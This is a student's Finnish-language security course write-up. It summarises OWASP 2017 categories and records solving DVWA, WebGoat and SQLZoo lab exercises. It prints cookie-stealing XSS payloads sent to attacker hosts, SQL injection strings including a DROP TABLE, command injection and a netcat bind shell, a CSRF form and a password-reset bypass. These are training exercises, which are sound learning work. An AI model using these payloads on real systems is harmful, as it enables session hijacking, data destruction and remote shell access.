# h3
## x) OWASP 2017


- OWASP (The Open Web Application Security Project) on avoin yhteisö, jonka tarkoituksena on auttaa yrityksiä ja yhteisöjä turvallisten verkkosovellusten ja rajapintojen kehittämisessä, hankkimisessa ja ylläpidossa.
- ### A1: Injection

    - #### Injektiohaavoittuvuudet kuten SQL. NoSQL, OS, LDAP
    - Tarkoituksena on saada kohdekoneen suorittamaan komentoja, joiden avulla hyökkääjä pääsee käsiksi dataan ilman tarvittavia käyttöoikeuksia
    - Hyökkääjä injektoi hyökkäyksensä kohdekoneen tulkkiin
    - Haavoittuvuuksia erityisesti legacy-ympäristöissä
    - Kohteina yleisesti SQL, LDAP, XPath, NoSQL kyselyissä, käyttöjärjestelmän komennoissa, XML-parsereissa, SMTP headereissa, ilmaisukielissä (esim palvelun oma syntaksi kuten Jiran JQL) ja ORM-kyselyissä
    - Esim haavoittuvassa APIssa on käytössä sanitoimaton SQL-kysely: 
        
        `String query = "SELECT * FROM accounts WHERE
        custID='" + request.getParameter("id") + "'";`
    Hyökkääjä voi muokata selaimen lähettämää pyyntöä APIin ja huijata APIa palauttamaan listan kaikkien käyttäjien tiedot. Tässä tapauksessa se tapahtuisi korvaamalla APIlle lähetetty parametri merkkijonolla `' or '1'='1`. Tällöin API-kutsu voisi olla esim `http://example.com/app/accountView?id=' or '1'='1`

- ### A2: Broken Authentication
    - #### Haavoittuvuudet käyttäjien oikeuksien varmistamisessa
    - Monia eri hyökkäysvektoreita
    - Esimerkiksi "credential stuffing" eli yleisimpien käytössä olevien salasanojen ja käyttäjänimien listojen käyttö hyökkäyksessä: haavoittuvan palvelun käyttäjien kirjautumispalveluun yritetään kirjautua kokeilemalla kaikki listan salasana/käyttäjänimi -yhdistelmät. Muutaman tuhannen peräkkäisen yrityksen jälkeen sopiva yhdistelmä löytyy ja hyökkääjä pääsee kirjautumaan palveluun

- ### A3: Sensitive Data Exposure
    - #### Haavoittuvuudet tietoturvallisen tiedon käsittelyssä
    - Hyökkääjä voi päästä kaappaamaan avaimia, tai muuta tietoturvallista tietoa 
    - EU:ssa käytössä oleva GDPR -lainsäädäntö velvoittaa yritykset käsittelemään tietoa turvallisesti
    - Esim: Sivusto ei pakota käyttäjää käyttämään TLS-salausta tai se käyttää huonompilaatuista salausta. Käyttäjä voi tarkastella verkkoliikennettä salaamattomana, tai hyökkääjä voi pakottaa verkkoliikenteen salaamaattomaksi (HTTPS -> HTTP). Hyökkääjä voi pomia pyyntöjen sisällön lennosta itselleen ja näin saada haltuunsa esimerkiksi luottokorttinumeroita tai käyttäjätietoja

- ### A7: Cross-site scripting
    - #### Cross-site scripting (XSS) -hyökkäyksiä on yleisesti kolmenlaisia:
        - Reflected XSS: hyökkäyksen kohde sisältää varmistamattoman ja 'unescaped' kohteen käyttäjän syötölle. Onnistunut hyökkäys mahdollistaa ulkopuolisen HTML- tai Javascript -koodin ajamisen selaimessa
        -Stored XSS: hyökkäksen kohde tallentaa käyttäjän syötteen varmistamattomana. Toinen käyttäjä tai ylläpitäjä tarkastelee syötettä myöhemmin, jolloin hyökkääjän injektoima koodi mahdollisesti suoritetaan
        - DOM XSS: hyökkäyksen kohteena erityisesti JS-frameworkit, SPA-sovellukset ja APIt, jotka mahdollistavat hyökkääjän hallinnoiman tiedon sisällyttämisen verkkosivulla
        
    - Esim (DOM XSS): Haavoittuva verkkosovellus tulostaa verkkosivulle html-koodinpätkän ilman validaatiota:

        `(String) page += "<input name='creditcard' type='TEXT'
        value='" + request.getParameter("CC") + "'>";`
    
        Hyökkääjä muokkaa http-kutsun 'CC'-parametriä:

        `'><script>document.location=
        'http://www.attacker.com/cgi-bin/cookie.cgi?
        foo='+document.cookie</script>'.`

        Tämän avulla hyökkääjä saa verkkosovelluksen lähettämään uhrin sessio-ID:n hyökkääjän ylläpitämälle sivustolle, joka mahdollistaa uhrin käyttäjäsession kaappamisen.

## y) Cross-site story


Hyökkääjä löytää verkosta sivuston, jonka eräällä sivulla on hakukenttä. Hyökkääjä testaa hakukentän haavoittuvuutta yksinkertaisella keinolla: hän syöttää hakukenttään arvoksi yksinkertaisen javascript-ohjelman:

        <script>alert('Hyökkäys toimii!')</script>

Tämän jälkeen hyökkääjä submitoi hakuterminsä, jolloin sivusto suorittaa hyökkääjän koodin ja selain luo popup-ikkunan jossa on hyökkääjän viesti. Hyökkäys näyttää siis toimivan.

Hyökkääjä pääsee siis hakukentän avulla suorittamaan omaa koodiaan. 

Hyökkääjällä on käytössään lista haavoittuvan sivuston käyttäjien sähköposteista sekä palvelin, jota hän voi käyttää hyökkäyksessään.
Hyökkääjä päättää varastaa sivuston käyttäjien sessiokeksit. Sitä varten hän valmistelee autenttisen näköisen sähköpostin, ja spooffaa lähettäjän nimen muistuttamaan haavoittuvan sivuston osoitetta.

Hyökkääjä sisällyttää sähköpostiinsa linkin, joka muistuttaa paljon haavoittuvalle sivustolle ohjaavaa linkkiä. Linkki on ohjaa suoraan haavoittuvan sivuston hakukenttään, jonka hakutermiksi on asetettu javascript-ohjelma, joka lähettää käyttäjän sessiokeksin hyökkääjän palvelimelle. Ohjelma voi olla esimerkiksi tämän kaltainen:

    <script>new Image().src="http://hyokkaajan-sivusto.ru/image.php?output="+document.cookie;</script>

Hyökkääjän palvelin poimii sessiokeksin talteen. Hyökkääjä ottaa yhden vastaanottamistaan keksien session ja käyttää sitä väärentääkseen käyttäjäsession haavoittuvalla sivustolla. Tällöin hyökkääjä pääsee käyttämään sivustoa varastamansa käyttäjän roolissa. 


## a) SQLZoo

### 0) Select basics

1. Tämä on yksinkertainen tehtävä, jossa muutetaan SQL-skriptissä kyselyn `name`-arvoa. Ratkaisu on yksinkertainen:
![](./img/selectbasics0.png)


2. Tämä tehtävä on samankaltainen kuin 0:


![](./img/selectbasics1.png)


3. Tehtävä 3 on myös helposti ratkaistavissa: 


![](./img/selectbasics2.png)


## b) Darn Vulnerabe Web Application

DVWA löytyy Metasploitable2:sta avaamalla selaimen metasploitable:n ip-osoitteeseen. Indeksisivulla on suora linkki Metasploitable2:n DVWA -palveluun. Loggaan palveluun sisään (tunnus: admin, salasana: password).

## c) Execute! DLWA - Command Execution

Ensin asetan DLWA:n security-asetuksen asetukselle "low":


![](./img/dvwa-securitysetting.png)

Tämän jälkeen aloitan Command Execution -harjoituksen. Sivustolla on teksti "Ping for free" ja alla tekstikenttä, johon voi syöttää tekstiä. 

Onkohan tekstikenttä yhteydessä mihin? Mitä tehtävässä on tarkoitus saavuttaa?
Kokeilen ensin ajaa tunnettua javascript-alert -testiä. Syötän hakukenttään tekstin 

    <script>alert('dakjdnsakjndaskjndsa')</alert>

Vastauksena ei tule mitään sivulle. Ehkä tämä ei toimikkaan. Hetken miettimisen jälkeen päätän syöttää Kali-koneeni ip-osoitteen:

![](./img/dvwa-exec-01.png)

Ilmeisesti hakukenttään menevä arvo menee suoraan isäntäympäristön konsoliin, jossa ajetaan `ping` -komento.

Voikohan komentoja ketjuttaa? Kokeilen linuxin pipe-operaattoria: annan hakutermiksi `192.168.56.102 | grep packets`. Tulos on lupaava:


![](./img/dwva-exec1.png)

Millä käyttäjällä komento ajetaan? Kokeilen komentoa`192.168.56.102 | who`

![](./img/dvwa-exec-02.png)

Komento ajetaan msfadmin -käyttäjällä! Mitä kaikkea tällä voikaan tehdä?

`192.168.56.101 | ls -la /root`:

![](./img/dvwa-exec-04.png)


Voikohan tätä kautta saada suoran shell-yhteyden? Joudun hieman lukemaan kuinka tämä voitaisiin toteuttaa. Luen sivustolta https://patchthenet.com/articles/create-bind-and-reverse-shells-using-netcat/ netcatin käyttämisestä tähän tarkoitukseen. 

Päätän hyökätä komennolla `192.168.56.101 |  nc -e ‘/bin/bash’ -l -p 8181`.

nc = netcat. Netcat on ohjelmisto tcp- ja udp-yhteyksien käsittelyn (https://fi.wikipedia.org/wiki/Netcat)

-e ‘/bin/bash’ = "execute" - kun yhteys saadaan, suoritetaan annettu komento. Meni hetkonen aikaa keksiä että hipsujen käyttö on tässä pakollista.


-l = listen mode. Netcat kuuntelee yhteyksiä.

-p = porttinumero jota netcat kuuntelee

Annettu komento ei anna mitään vastausta. Menikö komento perille? Mitään virheitä ei kuitenkaan tule. Päätän lisätä komentooni `-v`-flagin (=verbose). Se ei auta. 

Onkohan yhteys silti auki? Kokeilen ottaa yhteyden Kali Linuxilla:


![](./img/dvwa-exec-05.png)

Ei onnistu. nmapin mukaan portti on kuitenkin auki.

## d) Webgoat

### A1 - Injection
2. Tehtävässä pitää luoda SQL-query, jolla haetaan tietty henkilö 'employees' -taulusta:

![](./img/wg1.png)

3. Tehtävässä muutetaan 'employees' -taulun yhtä riviä:

![](./img/wg2.png)

4. Tehtävässä muutetaan 'employees' -taulua:

![](./img/wg03.png)

5. Tehtävässä muutetaan käyttäjäoikeuksia:

![](./img/WG04.png)

9. Tehtävässä tehdään yksinkertainen SQL-injektio:

![](./img/wg05.png)

10. Tehtävässä tehdään samankaltainen injektio, mutta kyselyn rakentamiseen ei anneta niin paljon apua:

![](./img/wg06.png)

11. Tehtävässä käytetään edellisestä tehtävästä tuttua injektiota, mutta tällä kertaa käytin SQL-syntaksin kommenttia lopettaakseni kyselyn haluaamni kohtaan. Syötin Employee Name -kenttään 

    `' or '1'='1' --`

Authentication TAN -kenttään käy mikä tahansa merkkijono.

![](./img/wg7.png)

12. Tehtävä ratkaistaan hyvin samankaltaisesti kuin edellinen, mutta tällä kertaa edellinen kysely lopetetaan (puolipiste) ja aloitetaan uusi kysely tämän jälkeen:

    `dgd'; UPDATE employees SET salary = '999999' where auth_tan='3SL99A'; --`


     Authentication TAN -kenttään käy taas mikä tahansa merkkijono.

![](./img/wg8.png)


13. Tehtävässä pitää ajaa taas ylimääräinen kysely tietokantaan. Ratkaisin tehtävän kirjottamalla kenttään

    `'; DROP TABLE access_log; --`

![](./img/wg9.png)

### A2: Broken Authentication

#### 2. 2FA Password reset
Tehtävässä pitää ohittaa salasananpalautustoiminnon turvakysymykset. Aloitan katselmoimalla sivun lähdekoodia. Löydän sivun lähdekoodista piilotetun formin:

![](./img/wg10.png)

Otan formilta pois `style="display:none"`. Elementti tulee näkyviin selaimessa:

![](./img/wg11.png)

Täytän kentät satunnaisilla arvoilla ja painan 'Submit'. Mitään ei näytä tapahtuvan, joten tarkastan developer toolsin 'network' tabin. Löydän sieltä pyynnön, joka on antanut virheen:

![](./img/wg12.png)

 Virhe on "Required String parameter 'verifyMethod' is not present",

 Kokeilen myös lähettää ylemmän formin. Ylempi form lähettää myös verifyMethod -parametrin:

 ![](./img/wg13.png)

 Mitä jos kopioisin verifyMethod-parametrin arvoineen toimimattomaan pyyntöön? Chromium-selaimissa on kätevä ominaisuus, jolla voi kopioida requestin fetch-funktiona. Nappaan pyynnön selaimesta talteen. Ajatuksena on ajaa se selaimen konsolista. Pyyntö näyttää tältä:
    
     fetch("http://192.168.0.155:8080/WebGoat/auth-bypass/verify-account", {
    "headers": {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest"
    },
    "referrer": "http://192.168.0.155:8080/WebGoat/start.mvc",
    "referrerPolicy": "strict-origin-when-cross-origin",
    "body": "newPassword=123&newPasswordConfirm=1234&userId=12309746",
    "method": "POST",
    "mode": "cors",
      "credentials": "include"
    });

Lisään body-elementtiin ylemmän formin pyynnön parametrit. Nyt pyynnön `body`-elementti näyttää seuraavanlaiselta:


     "body": "secQuestion0=asfgasfa&secQuestion1=asfsDGH&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746&newPassword=123&newPasswordConfirm=1234&"


Ei mitään muutosta. Pläräsin sivun lähdekoodia ja löysin lisää piilotettuja elementtejä nimeltään `secQuestion0`, `secQuestion1`, `verifyMethod` ja `userId`. Olisikohan tehtävän vinkeissä jotain huomionarvoista? 

Vinkeistä löytyy seuraavaa: 
    
    The logic to verify the account does expect 2 security questions to be answered, but there is a flaw in the implementation

Olisiko niin, että turvakysymyksiä ei tarvitsisi lähettää ollenkaan? Kokeilen tätä nimeämällä input-kentät uudelleen:

![](./img/wg14.png)

Painan 'submit' ja tehtävä ratkeaa! 

![](./img/wg15.png)

## A3: Sensitive Data Exposure

Tehtävässä pitää napata talteen "Log in" -nappulan aiheuttaman pyyntö.

Pyyntö näkyy Chromium-selaimissa developer-toolsin network-välilehdellä:

![](./img/wg16.png)

Tehtävä ratkeaa käyttämällä näitä tunnuksia.

## A7 Cross-site scripting

### 7) 

Tehtävässä pitää löytää hyökkäyskelpoiset kentät. Katsomalla sivun lähdekoodia huomaan, että "Quantity" -kentät ovat tyyppiä "number". Vaihdan ne lähdekoodista tyypiksi "TEXT". Syötän niihin yksinkertaisen pätkän javascript-koodia:

`<script>alert('random string')</script>`

Painan "Update cart" ja vastauksena tulee 404: bad request. Ainakaan nämä kentät eivät ole kelpoja hyökkäykselle. Ehkä backend käsittelee näitä lukuja numeroina?

Siirrytään seuraavaan kentään. Kirjoitan saman koodinpätkän "Enter your credit card number" -kenttään. Hyökkäys onnistuu, ja alert-popup hyppää ruudulle. 

![](./img/wg17.png)

Tehtävä on ratkaistu (tai ainakin tulkitsen viestin niin):

![](./img/wg18.png)


## A8:2013 Request Forgeries

### 3)

Tehtävässä pitää triggeröidä sivun formi sivun ulkopuolelta. Pitänee luoda siis sivu joka triggeröi sivun formin? Kokeillaanpa sitä. Kaivan harjoitussivun lähdekoodista formin koodin:

        <form accept-charset="UNKNOWN" id="basic-csrf-get" method="POST" name="form1" target="_blank" successcallback="" action="/WebGoat/csrf/basic-get-flag" enctype="application/json;charset=UTF-8">
        <input name="csrf" type="hidden" value="false">
        <input type="submit" name="submit">
        </form>

Formin 'action' -parametri pitää muuttaa osoittamaan WebGoat-palvelimeeni. Oman sivuni lähdekoodi näyttää tällä hetkellä tältä:
    
    <html>
    <body>
    <form id="basic-csrf-get" method="POST" name="form1" target="_blank" action="http://192.168.0.155:8080/WebGoat/csrf/basic-get-flag">
    <input name="csrf" type="hidden" value="false">
    <input type="submit" name="submit">
    </form>
    </body>
    </html>

Ei toimi. Jotain puuttuu. Olisiko requestissa jotain muutakin, mitä en huomannut? Katsotaanpa 'Submit' -napin takaa aukeavaa WebGoat/csrf/basic-get-flag -vastaussivua. Olisiko requestissa jotain parametrejä joita en huomannut aikaisemmin? Avaan developer toolsin network-väliehden ja olin oikeassa:

![](./img/wg19.png)

Formille pitää siis luoda uusi input nimeltään 'submit' ja antaa sille arvoksi 'Submit'. Lisään tämän sivuni lähdekoodiin, ja koodi näyttää tällä kertaa tältä:

    <html>
    <body>
    <form accept-charset="UNKNOWN" id="basic-csrf-get" method="POST" target="_blank"  action="http://192.168.0.155:8080/WebGoat/csrf/basic-get-flag" >
    <input name="csrf" type="hidden" value="false">
    <input name="submit" type="hidden" value="Submit">
    <input type="submit" name="submit">
    </form>
    </body>
    </html>

Temppu onnistuu ja saan seuraavanlaisen vastauksen:
   
    {
     "flag" : 31888,
     "success" : true,
     "message" : "Congratulations! Appears you made the request from a separate host."
    }

Syötettyäni saadun flag-numeron tehtävä on ratkaistu:

![](./img/wg20.png)

(sivu löytyy tämän hakemiston juuresta nimellä csrf.htm)



